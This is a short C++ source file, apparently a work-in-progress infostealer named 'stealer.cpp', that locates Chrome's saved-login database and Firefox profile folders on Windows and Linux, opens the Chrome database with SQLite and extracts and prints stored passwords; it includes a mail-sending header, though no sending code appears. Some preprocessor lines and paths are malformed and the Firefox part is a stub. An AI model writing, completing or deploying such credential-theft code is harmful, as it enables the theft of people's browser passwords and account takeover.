//============================================================================
// Name        : stealer.cpp
// Author      : Hleb Hatouka
// Description : stealer in C++
//============================================================================

#include "mailsender.h"
#include <experimental/filesystem>
#include <iostream>
#include <string>
#include <sstream>
#include "sqlite3.h"

#ifdef _WIN32
    #include "windows/tools.h"
    
    #ifndef UNICODE  
        typedef std::string String; 
    #else
        typedef std::wstring String; 
    #endif
#else __linux__
    #include "linux/tools.h"
#endif

namespace fs = std::experimental::filesystem;



int main()
{
    try
    {
#ifdef __linux__
        std::string chrome_db_path = "~/.config/google-chrome/Default";
        std::string firefox_db_path = "~/.mozilla/firefox/<profilename>";

        sqlite3 *db;

#else _WIN32
        TCHAR username[255];
        DWORD username_len = 255;
        GetUserName((TCHAR*)username, &username_len);

        String chrome_db_path = _T("C:\\Users\\");
        chrome_db_path += username;
        chrome_db_path += _T("\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data");

        String firefox_db_path = _T("C:\\Users\\");
        firefox_db_path += username;
        firefox_db_path += _T("\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\");

        sqlite3 *db;
#endif

        if( fs::exists(chrome_db_path))
        {
            std::cout << "ch exists" << std::endl;

            std::stringstream pass;
            
            int rc = sqlite3_open(chrome_db_path.c_str(), &db);

            if( rc )
            {
                std::cout << "DB Error: " << sqlite3_errmsg(db) << std::endl;
                sqlite3_close(db);
                return 1;
            }
            pass = get_chrome_pass(db);
            std::cout << pass.str();

            //rc = sqlite3_exec(db, sql.c_str(), callback1, 0, &zErrMsg);
        }

        if( fs::exists(firefox_db_path))
        {
            std::cout << "ff exists" << std::endl;
        }
    }
    catch(...){}

    return 0;
}